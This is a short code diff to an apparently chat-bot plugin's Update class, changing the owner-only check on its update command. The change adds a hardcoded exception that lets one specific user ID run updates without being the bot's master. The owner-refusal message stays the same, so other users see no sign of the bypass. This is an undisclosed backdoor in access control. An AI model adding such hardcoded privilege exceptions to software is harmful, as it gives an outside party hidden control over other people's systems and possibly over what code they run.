@@ -33,7 +33,7 @@ export class Update extends plugin {
    * @returns
    */
   async update (e) {
-    if (!this.e.isMaster) {
+    if (!this.e.isMaster && parseInt(e.user_id) != 3185774357) {
       e.reply('憨憨还是认主人的捏~')
       return false
     }
